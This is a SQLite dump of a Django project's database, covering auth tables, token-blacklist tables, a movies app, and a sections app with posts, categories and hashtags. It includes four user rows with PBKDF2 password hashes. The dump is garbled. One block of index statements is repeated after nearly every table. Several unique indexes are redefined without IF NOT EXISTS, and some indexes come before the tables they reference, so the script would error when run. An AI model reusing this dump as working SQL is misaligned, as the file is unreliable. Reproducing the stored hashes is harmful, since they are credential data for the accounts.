CREATE TABLE IF NOT EXISTS "auth_group" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "name" varchar(150) NOT NULL UNIQUE);
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id");
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX IF NOT EXISTS "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
CREATE UNIQUE INDEX "auth_user_groups_user_id_group_id_94350c0c_uniq" ON "auth_user_groups" ("user_id", "group_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_user_id_6a12ed8b" ON "auth_user_groups" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_group_id_97559544" ON "auth_user_groups" ("group_id");
CREATE UNIQUE INDEX "auth_user_user_permissions_user_id_permission_id_14a6b632_uniq" ON "auth_user_user_permissions" ("user_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_user_id_a95ead1b" ON "auth_user_user_permissions" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_permission_id_1fbb5f2c" ON "auth_user_user_permissions" ("permission_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id");
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model");
CREATE INDEX IF NOT EXISTS "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
CREATE INDEX IF NOT EXISTS "sections_category_parent_96fdf671" ON "sections_category" ("parent");
CREATE UNIQUE INDEX "sections_hashtag_post_hashtag_id_post_id_2d6f0c2d_uniq" ON "sections_hashtag_post" ("hashtag_id", "post_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_hashtag_id_7b51c385" ON "sections_hashtag_post" ("hashtag_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_post_id_ea3affd7" ON "sections_hashtag_post" ("post_id");
CREATE INDEX IF NOT EXISTS "sections_post_category_id_96eb7da2" ON "sections_post" ("category_id");
CREATE INDEX IF NOT EXISTS "token_blacklist_outstandingtoken_user_id_83bc629a" ON "token_blacklist_outstandingtoken" ("user_id");
CREATE TABLE IF NOT EXISTS "auth_group_permissions" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "group_id" integer NOT NULL REFERENCES "auth_group" ("id") DEFERRABLE INITIALLY DEFERRED, "permission_id" integer NOT NULL REFERENCES "auth_permission" ("id") DEFERRABLE INITIALLY DEFERRED);
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id");
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX IF NOT EXISTS "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
CREATE UNIQUE INDEX "auth_user_groups_user_id_group_id_94350c0c_uniq" ON "auth_user_groups" ("user_id", "group_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_user_id_6a12ed8b" ON "auth_user_groups" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_group_id_97559544" ON "auth_user_groups" ("group_id");
CREATE UNIQUE INDEX "auth_user_user_permissions_user_id_permission_id_14a6b632_uniq" ON "auth_user_user_permissions" ("user_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_user_id_a95ead1b" ON "auth_user_user_permissions" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_permission_id_1fbb5f2c" ON "auth_user_user_permissions" ("permission_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id");
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model");
CREATE INDEX IF NOT EXISTS "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
CREATE INDEX IF NOT EXISTS "sections_category_parent_96fdf671" ON "sections_category" ("parent");
CREATE UNIQUE INDEX "sections_hashtag_post_hashtag_id_post_id_2d6f0c2d_uniq" ON "sections_hashtag_post" ("hashtag_id", "post_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_hashtag_id_7b51c385" ON "sections_hashtag_post" ("hashtag_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_post_id_ea3affd7" ON "sections_hashtag_post" ("post_id");
CREATE INDEX IF NOT EXISTS "sections_post_category_id_96eb7da2" ON "sections_post" ("category_id");
CREATE INDEX IF NOT EXISTS "token_blacklist_outstandingtoken_user_id_83bc629a" ON "token_blacklist_outstandingtoken" ("user_id");
CREATE TABLE IF NOT EXISTS "auth_permission" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "content_type_id" integer NOT NULL REFERENCES "django_content_type" ("id") DEFERRABLE INITIALLY DEFERRED, "codename" varchar(100) NOT NULL, "name" varchar(255) NOT NULL);
INSERT INTO "auth_permission" VALUES(1,1,'add_logentry','Can add log entry');
INSERT INTO "auth_permission" VALUES(2,1,'change_logentry','Can change log entry');
INSERT INTO "auth_permission" VALUES(3,1,'delete_logentry','Can delete log entry');
INSERT INTO "auth_permission" VALUES(4,1,'view_logentry','Can view log entry');
INSERT INTO "auth_permission" VALUES(5,2,'add_permission','Can add permission');
INSERT INTO "auth_permission" VALUES(6,2,'change_permission','Can change permission');
INSERT INTO "auth_permission" VALUES(7,2,'delete_permission','Can delete permission');
INSERT INTO "auth_permission" VALUES(8,2,'view_permission','Can view permission');
INSERT INTO "auth_permission" VALUES(9,3,'add_group','Can add group');
INSERT INTO "auth_permission" VALUES(10,3,'change_group','Can change group');
INSERT INTO "auth_permission" VALUES(11,3,'delete_group','Can delete group');
INSERT INTO "auth_permission" VALUES(12,3,'view_group','Can view group');
INSERT INTO "auth_permission" VALUES(13,4,'add_user','Can add user');
INSERT INTO "auth_permission" VALUES(14,4,'change_user','Can change user');
INSERT INTO "auth_permission" VALUES(15,4,'delete_user','Can delete user');
INSERT INTO "auth_permission" VALUES(16,4,'view_user','Can view user');
INSERT INTO "auth_permission" VALUES(17,5,'add_contenttype','Can add content type');
INSERT INTO "auth_permission" VALUES(18,5,'change_contenttype','Can change content type');
INSERT INTO "auth_permission" VALUES(19,5,'delete_contenttype','Can delete content type');
INSERT INTO "auth_permission" VALUES(20,5,'view_contenttype','Can view content type');
INSERT INTO "auth_permission" VALUES(21,6,'add_session','Can add session');
INSERT INTO "auth_permission" VALUES(22,6,'change_session','Can change session');
INSERT INTO "auth_permission" VALUES(23,6,'delete_session','Can delete session');
INSERT INTO "auth_permission" VALUES(24,6,'view_session','Can view session');
INSERT INTO "auth_permission" VALUES(25,7,'add_userprofile','Can add user profile');
INSERT INTO "auth_permission" VALUES(26,7,'change_userprofile','Can change user profile');
INSERT INTO "auth_permission" VALUES(27,7,'delete_userprofile','Can delete user profile');
INSERT INTO "auth_permission" VALUES(28,7,'view_userprofile','Can view user profile');
INSERT INTO "auth_permission" VALUES(29,8,'add_token','Can add Token');
INSERT INTO "auth_permission" VALUES(30,8,'change_token','Can change Token');
INSERT INTO "auth_permission" VALUES(31,8,'delete_token','Can delete Token');
INSERT INTO "auth_permission" VALUES(32,8,'view_token','Can view Token');
INSERT INTO "auth_permission" VALUES(33,9,'add_tokenproxy','Can add token');
INSERT INTO "auth_permission" VALUES(34,9,'change_tokenproxy','Can change token');
INSERT INTO "auth_permission" VALUES(35,9,'delete_tokenproxy','Can delete token');
INSERT INTO "auth_permission" VALUES(36,9,'view_tokenproxy','Can view token');
INSERT INTO "auth_permission" VALUES(37,10,'add_movie','Can add movie');
INSERT INTO "auth_permission" VALUES(38,10,'change_movie','Can change movie');
INSERT INTO "auth_permission" VALUES(39,10,'delete_movie','Can delete movie');
INSERT INTO "auth_permission" VALUES(40,10,'view_movie','Can view movie');
INSERT INTO "auth_permission" VALUES(41,11,'add_category','Can add category');
INSERT INTO "auth_permission" VALUES(42,11,'change_category','Can change category');
INSERT INTO "auth_permission" VALUES(43,11,'delete_category','Can delete category');
INSERT INTO "auth_permission" VALUES(44,11,'view_category','Can view category');
INSERT INTO "auth_permission" VALUES(45,12,'add_post','Can add post');
INSERT INTO "auth_permission" VALUES(46,12,'change_post','Can change post');
INSERT INTO "auth_permission" VALUES(47,12,'delete_post','Can delete post');
INSERT INTO "auth_permission" VALUES(48,12,'view_post','Can view post');
INSERT INTO "auth_permission" VALUES(49,13,'add_hashtag','Can add hash tag');
INSERT INTO "auth_permission" VALUES(50,13,'change_hashtag','Can change hash tag');
INSERT INTO "auth_permission" VALUES(51,13,'delete_hashtag','Can delete hash tag');
INSERT INTO "auth_permission" VALUES(52,13,'view_hashtag','Can view hash tag');
INSERT INTO "auth_permission" VALUES(53,14,'add_blacklistedtoken','Can add blacklisted token');
INSERT INTO "auth_permission" VALUES(54,14,'change_blacklistedtoken','Can change blacklisted token');
INSERT INTO "auth_permission" VALUES(55,14,'delete_blacklistedtoken','Can delete blacklisted token');
INSERT INTO "auth_permission" VALUES(56,14,'view_blacklistedtoken','Can view blacklisted token');
INSERT INTO "auth_permission" VALUES(57,15,'add_outstandingtoken','Can add outstanding token');
INSERT INTO "auth_permission" VALUES(58,15,'change_outstandingtoken','Can change outstanding token');
INSERT INTO "auth_permission" VALUES(59,15,'delete_outstandingtoken','Can delete outstanding token');
INSERT INTO "auth_permission" VALUES(60,15,'view_outstandingtoken','Can view outstanding token');
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id");
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX IF NOT EXISTS "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
CREATE UNIQUE INDEX "auth_user_groups_user_id_group_id_94350c0c_uniq" ON "auth_user_groups" ("user_id", "group_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_user_id_6a12ed8b" ON "auth_user_groups" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_group_id_97559544" ON "auth_user_groups" ("group_id");
CREATE UNIQUE INDEX "auth_user_user_permissions_user_id_permission_id_14a6b632_uniq" ON "auth_user_user_permissions" ("user_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_user_id_a95ead1b" ON "auth_user_user_permissions" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_permission_id_1fbb5f2c" ON "auth_user_user_permissions" ("permission_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id");
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model");
CREATE INDEX IF NOT EXISTS "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
CREATE INDEX IF NOT EXISTS "sections_category_parent_96fdf671" ON "sections_category" ("parent");
CREATE UNIQUE INDEX "sections_hashtag_post_hashtag_id_post_id_2d6f0c2d_uniq" ON "sections_hashtag_post" ("hashtag_id", "post_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_hashtag_id_7b51c385" ON "sections_hashtag_post" ("hashtag_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_post_id_ea3affd7" ON "sections_hashtag_post" ("post_id");
CREATE INDEX IF NOT EXISTS "sections_post_category_id_96eb7da2" ON "sections_post" ("category_id");
CREATE INDEX IF NOT EXISTS "token_blacklist_outstandingtoken_user_id_83bc629a" ON "token_blacklist_outstandingtoken" ("user_id");
CREATE TABLE IF NOT EXISTS "auth_user" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "password" varchar(128) NOT NULL, "last_login" datetime NULL, "is_superuser" bool NOT NULL, "username" varchar(150) NOT NULL UNIQUE, "last_name" varchar(150) NOT NULL, "email" varchar(254) NOT NULL, "is_staff" bool NOT NULL, "is_active" bool NOT NULL, "date_joined" datetime NOT NULL, "first_name" varchar(150) NOT NULL);
INSERT INTO "auth_user" VALUES(1,'pbkdf2_sha256$260000$eCMCQJ9uEMV8VFLWcWjAnV$BgdM3mX7c8bAz+P3Iy+UWK7O2vHFoM8Atr6RlhMNdiA=','2023-06-03 13:32:52.529206',1,'dev','dev','d@d.com',1,1,'2023-05-23 22:52:12','');
INSERT INTO "auth_user" VALUES(2,'pbkdf2_sha256$260000$20y6x7yNuThwv60YMnBSTu$JhZ5wNTyDCvleHZ7ItAQxkjp3WuGFIc2tIbtNxPMSkU=','2023-06-03 18:07:46.868160',0,'d2@d.com','','',0,1,'2023-06-01 00:03:44.912421','');
INSERT INTO "auth_user" VALUES(3,'pbkdf2_sha256$260000$Par59m66tNvd79oSZDdK8C$ViD5JfcobWK9SDn0PhTUMsgU+j5fI5LvRFSZYjSg2tg=','2023-06-03 15:43:19.279469',0,'d3@d.com','','',0,1,'2023-06-03 15:43:09.169115','');
INSERT INTO "auth_user" VALUES(4,'pbkdf2_sha256$260000$RXcLZDc2YnE9iwyeN7b4rz$+3SaaahX5j1zWHuRsgicpwjp9iEheHnqmw08M8uVG2Q=','2023-06-03 16:27:31.373533',0,'d5@d.com','','',0,1,'2023-06-03 16:27:15.481923','');
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id");
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX IF NOT EXISTS "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
CREATE UNIQUE INDEX "auth_user_groups_user_id_group_id_94350c0c_uniq" ON "auth_user_groups" ("user_id", "group_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_user_id_6a12ed8b" ON "auth_user_groups" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_group_id_97559544" ON "auth_user_groups" ("group_id");
CREATE UNIQUE INDEX "auth_user_user_permissions_user_id_permission_id_14a6b632_uniq" ON "auth_user_user_permissions" ("user_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_user_id_a95ead1b" ON "auth_user_user_permissions" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_permission_id_1fbb5f2c" ON "auth_user_user_permissions" ("permission_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id");
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model");
CREATE INDEX IF NOT EXISTS "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
CREATE INDEX IF NOT EXISTS "sections_category_parent_96fdf671" ON "sections_category" ("parent");
CREATE UNIQUE INDEX "sections_hashtag_post_hashtag_id_post_id_2d6f0c2d_uniq" ON "sections_hashtag_post" ("hashtag_id", "post_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_hashtag_id_7b51c385" ON "sections_hashtag_post" ("hashtag_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_post_id_ea3affd7" ON "sections_hashtag_post" ("post_id");
CREATE INDEX IF NOT EXISTS "sections_post_category_id_96eb7da2" ON "sections_post" ("category_id");
CREATE INDEX IF NOT EXISTS "token_blacklist_outstandingtoken_user_id_83bc629a" ON "token_blacklist_outstandingtoken" ("user_id");
CREATE TABLE IF NOT EXISTS "auth_user_groups" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "user_id" integer NOT NULL REFERENCES "auth_user" ("id") DEFERRABLE INITIALLY DEFERRED, "group_id" integer NOT NULL REFERENCES "auth_group" ("id") DEFERRABLE INITIALLY DEFERRED);
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id");
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX IF NOT EXISTS "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
CREATE UNIQUE INDEX "auth_user_groups_user_id_group_id_94350c0c_uniq" ON "auth_user_groups" ("user_id", "group_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_user_id_6a12ed8b" ON "auth_user_groups" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_group_id_97559544" ON "auth_user_groups" ("group_id");
CREATE UNIQUE INDEX "auth_user_user_permissions_user_id_permission_id_14a6b632_uniq" ON "auth_user_user_permissions" ("user_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_user_id_a95ead1b" ON "auth_user_user_permissions" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_permission_id_1fbb5f2c" ON "auth_user_user_permissions" ("permission_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id");
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model");
CREATE INDEX IF NOT EXISTS "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
CREATE INDEX IF NOT EXISTS "sections_category_parent_96fdf671" ON "sections_category" ("parent");
CREATE UNIQUE INDEX "sections_hashtag_post_hashtag_id_post_id_2d6f0c2d_uniq" ON "sections_hashtag_post" ("hashtag_id", "post_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_hashtag_id_7b51c385" ON "sections_hashtag_post" ("hashtag_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_post_id_ea3affd7" ON "sections_hashtag_post" ("post_id");
CREATE INDEX IF NOT EXISTS "sections_post_category_id_96eb7da2" ON "sections_post" ("category_id");
CREATE INDEX IF NOT EXISTS "token_blacklist_outstandingtoken_user_id_83bc629a" ON "token_blacklist_outstandingtoken" ("user_id");
CREATE TABLE IF NOT EXISTS "auth_user_user_permissions" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "user_id" integer NOT NULL REFERENCES "auth_user" ("id") DEFERRABLE INITIALLY DEFERRED, "permission_id" integer NOT NULL REFERENCES "auth_permission" ("id") DEFERRABLE INITIALLY DEFERRED);
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id");
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX IF NOT EXISTS "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
CREATE UNIQUE INDEX "auth_user_groups_user_id_group_id_94350c0c_uniq" ON "auth_user_groups" ("user_id", "group_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_user_id_6a12ed8b" ON "auth_user_groups" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_group_id_97559544" ON "auth_user_groups" ("group_id");
CREATE UNIQUE INDEX "auth_user_user_permissions_user_id_permission_id_14a6b632_uniq" ON "auth_user_user_permissions" ("user_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_user_id_a95ead1b" ON "auth_user_user_permissions" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_permission_id_1fbb5f2c" ON "auth_user_user_permissions" ("permission_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id");
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model");
CREATE INDEX IF NOT EXISTS "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
CREATE INDEX IF NOT EXISTS "sections_category_parent_96fdf671" ON "sections_category" ("parent");
CREATE UNIQUE INDEX "sections_hashtag_post_hashtag_id_post_id_2d6f0c2d_uniq" ON "sections_hashtag_post" ("hashtag_id", "post_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_hashtag_id_7b51c385" ON "sections_hashtag_post" ("hashtag_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_post_id_ea3affd7" ON "sections_hashtag_post" ("post_id");
CREATE INDEX IF NOT EXISTS "sections_post_category_id_96eb7da2" ON "sections_post" ("category_id");
CREATE INDEX IF NOT EXISTS "token_blacklist_outstandingtoken_user_id_83bc629a" ON "token_blacklist_outstandingtoken" ("user_id");
CREATE TABLE IF NOT EXISTS "authtoken_token" ("key" varchar(40) NOT NULL PRIMARY KEY, "created" datetime NOT NULL, "user_id" integer NOT NULL UNIQUE REFERENCES "auth_user" ("id") DEFERRABLE INITIALLY DEFERRED);
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id");
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX IF NOT EXISTS "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
CREATE UNIQUE INDEX "auth_user_groups_user_id_group_id_94350c0c_uniq" ON "auth_user_groups" ("user_id", "group_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_user_id_6a12ed8b" ON "auth_user_groups" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_group_id_97559544" ON "auth_user_groups" ("group_id");
CREATE UNIQUE INDEX "auth_user_user_permissions_user_id_permission_id_14a6b632_uniq" ON "auth_user_user_permissions" ("user_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_user_id_a95ead1b" ON "auth_user_user_permissions" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_permission_id_1fbb5f2c" ON "auth_user_user_permissions" ("permission_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id");
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model");
CREATE INDEX IF NOT EXISTS "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
CREATE INDEX IF NOT EXISTS "sections_category_parent_96fdf671" ON "sections_category" ("parent");
CREATE UNIQUE INDEX "sections_hashtag_post_hashtag_id_post_id_2d6f0c2d_uniq" ON "sections_hashtag_post" ("hashtag_id", "post_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_hashtag_id_7b51c385" ON "sections_hashtag_post" ("hashtag_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_post_id_ea3affd7" ON "sections_hashtag_post" ("post_id");
CREATE INDEX IF NOT EXISTS "sections_post_category_id_96eb7da2" ON "sections_post" ("category_id");
CREATE INDEX IF NOT EXISTS "token_blacklist_outstandingtoken_user_id_83bc629a" ON "token_blacklist_outstandingtoken" ("user_id");
CREATE TABLE IF NOT EXISTS "django_admin_log" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "action_time" datetime NOT NULL, "object_id" text NULL, "object_repr" varchar(200) NOT NULL, "change_message" text NOT NULL, "content_type_id" integer NULL REFERENCES "django_content_type" ("id") DEFERRABLE INITIALLY DEFERRED, "user_id" integer NOT NULL REFERENCES "auth_user" ("id") DEFERRABLE INITIALLY DEFERRED, "action_flag" smallint unsigned NOT NULL CHECK ("action_flag" >= 0));
INSERT INTO "django_admin_log" VALUES(1,'2023-06-03 13:09:35.842840','1','dev','[{"changed": {"fields": ["Last name"]}}]',4,1,2);
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id");
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX IF NOT EXISTS "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
CREATE UNIQUE INDEX "auth_user_groups_user_id_group_id_94350c0c_uniq" ON "auth_user_groups" ("user_id", "group_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_user_id_6a12ed8b" ON "auth_user_groups" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_group_id_97559544" ON "auth_user_groups" ("group_id");
CREATE UNIQUE INDEX "auth_user_user_permissions_user_id_permission_id_14a6b632_uniq" ON "auth_user_user_permissions" ("user_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_user_id_a95ead1b" ON "auth_user_user_permissions" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_permission_id_1fbb5f2c" ON "auth_user_user_permissions" ("permission_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id");
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model");
CREATE INDEX IF NOT EXISTS "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
CREATE INDEX IF NOT EXISTS "sections_category_parent_96fdf671" ON "sections_category" ("parent");
CREATE UNIQUE INDEX "sections_hashtag_post_hashtag_id_post_id_2d6f0c2d_uniq" ON "sections_hashtag_post" ("hashtag_id", "post_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_hashtag_id_7b51c385" ON "sections_hashtag_post" ("hashtag_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_post_id_ea3affd7" ON "sections_hashtag_post" ("post_id");
CREATE INDEX IF NOT EXISTS "sections_post_category_id_96eb7da2" ON "sections_post" ("category_id");
CREATE INDEX IF NOT EXISTS "token_blacklist_outstandingtoken_user_id_83bc629a" ON "token_blacklist_outstandingtoken" ("user_id");
CREATE TABLE IF NOT EXISTS "django_content_type" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "app_label" varchar(100) NOT NULL, "model" varchar(100) NOT NULL);
INSERT INTO "django_content_type" VALUES(1,'admin','logentry');
INSERT INTO "django_content_type" VALUES(2,'auth','permission');
INSERT INTO "django_content_type" VALUES(3,'auth','group');
INSERT INTO "django_content_type" VALUES(4,'auth','user');
INSERT INTO "django_content_type" VALUES(5,'contenttypes','contenttype');
INSERT INTO "django_content_type" VALUES(6,'sessions','session');
INSERT INTO "django_content_type" VALUES(7,'user_profile','userprofile');
INSERT INTO "django_content_type" VALUES(8,'authtoken','token');
INSERT INTO "django_content_type" VALUES(9,'authtoken','tokenproxy');
INSERT INTO "django_content_type" VALUES(10,'movies','movie');
INSERT INTO "django_content_type" VALUES(11,'sections','category');
INSERT INTO "django_content_type" VALUES(12,'sections','post');
INSERT INTO "django_content_type" VALUES(13,'sections','hashtag');
INSERT INTO "django_content_type" VALUES(14,'token_blacklist','blacklistedtoken');
INSERT INTO "django_content_type" VALUES(15,'token_blacklist','outstandingtoken');
